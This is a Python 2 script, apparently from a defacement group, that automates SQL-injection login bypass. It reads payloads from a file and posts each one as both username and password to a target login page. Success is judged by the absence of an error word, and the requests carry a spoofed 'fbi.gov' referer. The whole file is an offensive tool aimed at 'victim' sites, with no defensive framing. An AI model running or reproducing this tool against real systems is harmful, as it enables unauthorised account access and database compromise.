#!/usr/bin/python 
# -*- coding: utf-8 -*-

import urllib
import urllib2
import re
import argparse
import sys
from termcolor import colored
from cookielib import CookieJar



request_headers = {
		
		"Accept-Language" : "en-US,en;q=0.5",
		"User-Agent"	  : "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
		"Accept"          : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Referer"         : "http://fbi.gov",
		"Connection"      : "keep-alive" 
}

try: 
	f 		= open("payloads.txt","r")
except IOError:
	sys.exit('File doesn\'t exist!')

about = colored("""
-----------------------------------------
--                                     --
-- SQLi login payload Scanner. v.2     --
--                                     --
-- Camoufl4g3                          --
--                                     --
-- Azdefacers.org                      --
-- Select the option -help for help    --
-----------------------------------------

""",'green')

#--------------------------------------------------- Scan function -------------------------------------------------

print about

def Main():


	parser = argparse.ArgumentParser()

	parser.add_argument('-t',
                          action = "store", #stored
                          dest   = "target",
                          #type   = "string", #int tipi
                          help = "for example: ./payloader.py -t victim.com")


	parser.add_argument('-uc',
                          action = "store", #stored
                          dest   = "uc",
                          #type   = "string", #int tipi
                          help = "for example: ./payloader.py -uc username column")



	parser.add_argument('-pc',
                          action = "store", #stored
                          dest   = "pc",
                          #type   = "string", #int tipi
                          help = "for example: ./payloader.py -pc password column")


	parser.add_argument('-exception',
                          action = "store", #stored
                          dest   = "exception",
                          #type   = "string", #int tipi
                          help = "for example: ./payloader.py -a exception word")




	args   = parser.parse_args()



	if args.target:
		print("# Creating target " + args.target)


	if args.uc:
		print("# Creating user column " + args.uc)


	if args.pc:
		print("# Creating password column " + args.pc)

	if args.exception:
		print("# Creating exception " + args.exception)	

	print '--------------------------------------------'	
	target   = args.target


	request  = urllib2.Request(target,headers=request_headers)

	for line in f.readlines():
		
		try:
			
			cj = CookieJar()
			opener   = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
			data     = urllib.urlencode({args.uc:line.rstrip('\n'),args.pc:line.rstrip('\n')})
			u        = opener.open(target, data)
			getcode  = u.getcode()
			#print u.read()
			
			match    = re.findall(r'{}'.format(args.exception),u.read())
		except KeyboardInterrupt:
			print 'stopped'

		

		if(match):
			print  line.rstrip('\n') + " " + colored('[-]', 'red')
		else:
			print line.rstrip('\n') + " " + colored('[+]', 'green')


if __name__ == "__main__":
	Main()
